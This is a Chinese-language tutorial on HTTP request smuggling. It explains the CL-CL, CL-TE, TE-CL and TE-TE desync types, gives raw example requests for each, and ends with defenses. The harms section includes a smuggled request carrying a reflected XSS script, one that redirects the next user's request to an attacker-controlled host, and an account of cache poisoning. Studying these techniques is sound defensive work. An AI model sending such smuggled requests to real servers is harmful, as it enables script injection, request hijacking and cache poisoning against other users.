# HTTP请求走私

HTTP 请求走私源于前端和后端服务器之间关于消息正文大小的分歧，而这种分歧可能会被滥用，从而干扰 Web 应用程序处理从用户收到请求的方式

攻击者通过在自己的请求中夹带一个请求, 来影响到下一个请求中

## 请求走私种类

### CL不为0的GET请求

当前端服务器允许GET请求携带请求体，而后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的 Content-Length 头，不进行处理，这就有可能导致请求走私。

举例：

    GET / HTTP/1.1
    Host: example.com
    Content-Length: 44
     
     GET /secret HTTP/1.1
    Host: example.com
    

前端服务器处理了 Content-Length ，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。

### CL-CL

根据RFC 7230，当服务器收到的请求中包含两个 Content-Length ，而且两者的值不同时，需要返回400错误，但是总有服务器不会严格的实现该规范，

假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误，但是中间代理服务器按照第一个Content-Length的值对请求进行处理，

而后端源站服务器按照第二个Content-Length的值进行处理。这种情况下，当前后端各取不同的 Content-Length 值时，就会出现漏洞。

举例：

这个例子中a就会被带入下一个请求，变为 aGET / HTTP/1.1\r\n 。

    POST / HTTP/1.1
    Host: example.com
    Content-Length: 8
    Content-Length: 7
     
    12345
    a

例子中的a会被带入下一个请求中，变成aGET / HTTP/1.1

### CL-TE

CL-TE就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length这一请求头，

而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding这一请求头。

例子

    POST / HTTP/1.1
    Host: example.com
    ...
    Connection: keep-alive
    Content-Length: 6
    Transfer-Encoding: chunked
    
    0
    
    a
    
这个例子中a同样会被带入下一个请求，变为 aGET / HTTP/1.1

### TE:CL

TE-CL指就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头

举例


    Default
    POST / HTTP/1.1
    Host: xxx.xxx.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: session=MDCGt1IHa1MdeOnP1wkjRX15gMuiEGT6
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 4
    Transfer-Encoding: chunked
     
    12
    GPOST / HTTP/1.1
     
    0
    
chunked检测合理, 注意0\r\n\r\n是规定的结束格式, 然后后端只取12\r\n, 剩下来的东西就变成下一个请求的一部分。


### TE-TE

TE-TE指当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，这确实是实现了RFC的标准。

不过前后端服务器毕竟不是同一种，这就有了一种方法，

我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作，从而使其中一个服务器不处理Transfer-Encoding请求头。

从某种意义上还是CL-TE或者TE-CL。

例子

    POST / HTTP/1.1
    Host: example.com
    ...
    Content-length: 4
    Transfer-Encoding: chunked
    Transfer-encoding: cow
    
    5c
    aPOST / HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 15
    
    x=1
    0

这里的情况是前端服务器以第一个TE为标准后端服务器以第二个为标准, 前端服务器通过之后, 

后端服务器的TE值不存在, 就转而使用Content-Length为依据, 这个时候的情况就相当于TE-CL情况。

## 危害

### 请求走私引发反射型XSS

#### 场景举例

这个场景包含前端和后端服务器，并且前端服务器不支持Chunked-Encoding。应用程序在User-Agent这个标头含有反射型XSS漏洞。

单个的UA处的xss并没有什么危害，但当我们将它与请求走私相结合时，就可以导致其他用户访问任意界面出现反射型xss，对客户端和网页有一定影响

首先看是否能触发XSS，如果能触发，接下来进行请求走私，因为前端不支持Chunked编码方式，

那么我们这里就可以尝试一下去构造CL-TE种类的请求走私，构造XSS，恶意代码如下

    Content-Length: 154
    Transfer-Encoding: chunked
    
    0
    
    GET /post?postId=5 HTTP/1.1
    User-Agent: a"/><script>alert(1)</script>
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5
    
    x=1

第一次访问正常，接下来用户去访问界面，成功触发了XSS

这个过程是:

前端代理服务器：接收的是CL，然后检测内容没有什么问题，传输给后端服务器

后端服务器：接收的是TE，接收到0后停止接收，而下面的还没被接收，被认为是另一个独立的请求，当此时有一个用户去访问界面时，这个请求就会发出，触发XSS

---
或者利用CL-TE请求走私就可以将下一请求指向这个存在xss的地址，那结合刚刚的js文件，就可以触发xss

例子

    POST / HTTP/1.1
    Host: 目标host
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 184
    Transfer-Encoding: chunk
     
    0
     
    GET /post/next?postId=3 Http/1.1
    Host: 攻击者服务器host
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 10
     
    x=1
    
### 请求走私实现Web缓存投毒

WEB缓存就是指网站的静态文件，比如图片、CSS、JS等，在网站访问的时候，服务器会将这些文件缓存起来，以便下次访问时直接从缓存中读取，不需要再次请求服务器。

但当请求中部分内容会在响应包中出现，这会存在不好的影响

比如第一个人改了一些包，发送到后端，导致后端返回一些恶意数据，xss这种等等，

同时由于缓存机制，后续的其他用户访问此界面时会加载这个恶意缓存，此时就造成了Web缓存投毒。


## 防御

* 禁用后端连接重用
* 确保连接中的所有服务器具有相同的配置
* 拒绝有二义性的请求
* 使用HTTP/2
* 严格的实现RFC7230-7235中所规定的的标准

